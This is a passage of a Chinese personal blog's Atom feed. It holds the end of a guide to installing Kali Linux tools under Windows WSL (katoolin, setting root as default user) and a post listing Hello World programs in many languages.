class="line"><span class="comment">#执行(1-&gt;1-&gt;2) -&gt; back -&gt; (2-&gt;0)</span></span><br></pre></td></tr></table></figure><p>即可安装工具成功</p><p>注: 有可能出现安装不成功类似于图示错误</p><p><img src="https://i.loli.net/2021/01/07/DrmB2uhgR38bGWa.png" alt="img"></p><p>由于某些工具不存在源或其他原因不能一次全部安装，需要修改/usr/bin/katoolin 中源代码，将不存在的工具删除</p><p>下面是我更改好的源代码地址</p><blockquote><p><a href="https://github.com/Gr3enh4nd/katoolin.git" target="_blank" rel="noopener">https://github.com/Gr3enh4nd/katoolin.git</a></p></blockquote><p>至此工具安装完成</p><p>我们打开一个msf</p><h2 id="注"><a href="#注" class="headerlink" title="注"></a><strong>注</strong></h2><h3 id="安装kali工具另一种方法："><a href="#安装kali工具另一种方法：" class="headerlink" title="安装kali工具另一种方法："></a><strong>安装kali工具另一种方法：</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-linux-full</span><br></pre></td></tr></table></figure><h3 id="更改默认用户为root："><a href="#更改默认用户为root：" class="headerlink" title="更改默认用户为root："></a><strong>更改默认用户为root：</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali config --default-user root </span><br><span class="line"></span><br><span class="line">//WSL 子系统是基于 LxssManager 服务运行的，在更改过默认用户后，我们需要重启该服务，使改动生效 </span><br><span class="line"></span><br><span class="line">net stop LxssManager </span><br><span class="line"></span><br><span class="line">net start LxssManager</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;打开windows开发人员模式&quot;&gt;&lt;a href=&quot;#打开windows开发人员模式&quot; class=&quot;headerlink&quot; title=&quot;打开windows开发人员模式&quot;&gt;&lt;/a&gt;打开windows开发人员模式&lt;/h2&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://goudanjun.vip/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>hello world</title>
    <link href="http://goudanjun.vip/2019/07/24/hello-world.html/"/>
    <id>http://goudanjun.vip/2019/07/24/hello-world.html/</id>
    <published>2019-07-24T12:27:22.000Z</published>
    <updated>2021-01-07T15:02:44.998Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Bat命令"><a href="#Bat命令" class="headerlink" title="Bat命令"></a>Bat命令</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Hello, world!</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello, World!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"Hello,world!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        System.out.println( <span class="string">"Hello, World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello, World!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-2"><a href="#C-2" class="headerlink" title="C"></a>C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">namespace HelloWorld</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">   &#123;</span><br><span class="line">            System.Console.Write(&quot;Hello, World!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, world!'</span>;  </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Hello, world!'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.write (&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert (<span class="string">"Hello, World!"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">``</span><span class="string">"Hello, World!"</span><span class="string">``</span>);</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></table></figure><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Bat命令&quot;&gt;&lt;a href=&quot;#Bat命令&quot; class=&quot;headerlink&quot; title=&quot;Bat命令&quot;&gt;&lt;/a&gt;Bat命令&lt;/h3&gt;&lt;figure class=&quot;highlight bat&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; Hello, world!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;pause&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
